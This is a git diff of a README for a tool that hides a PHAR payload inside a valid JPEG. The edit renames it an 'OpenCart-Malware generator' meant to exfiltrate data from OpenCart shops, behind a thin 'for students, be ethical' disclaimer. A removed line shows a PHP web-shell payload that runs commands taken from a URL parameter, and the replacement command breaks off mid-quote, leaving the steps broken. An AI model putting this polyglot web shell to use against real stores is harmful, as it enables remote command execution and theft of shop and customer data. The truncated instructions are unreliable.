@@ -1,10 +1,12 @@
-# JPEG PHAR Fusion
+# JPEG PHAR OpenCart-Malware generator
 
-![Very cool picture](https://github.com/Sarapuce/jpeg-phar-fusion/blob/main/fusion.jpeg)
+This is a simple tool to add a malicious phar payload at the end of a valid jpeg image to exfilter data from an Opencart shopping system!
 
-This is a simple tool to add a phar payload at the end of a valid jpeg image.
+It is based on a fork of the Repo Sarapuce/jpeg-phar-fusion.
 
-## Requierments
+It is only meant to be a learning to for Cybersecurity Student! Be Ethical!
+
+## Requirements
 - Python 3
 - Php (Tested with php 8)
 
@@ -16,12 +18,11 @@ This is a simple tool to add a phar payload at the end of a valid jpeg image.
 
 3. Create the payload with the script
 
-`python3 phar_creator.py '<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>'`
+`python3 phar_creator.py '
 
-4. The file is in `payload.jpg`
+4. The generated PHAR/JPEG polyglot file is called `malicious.jpg`
 
 5. Run "php include.php" to see the code executed!!
-
 
 
 ## It doesn't work 😡
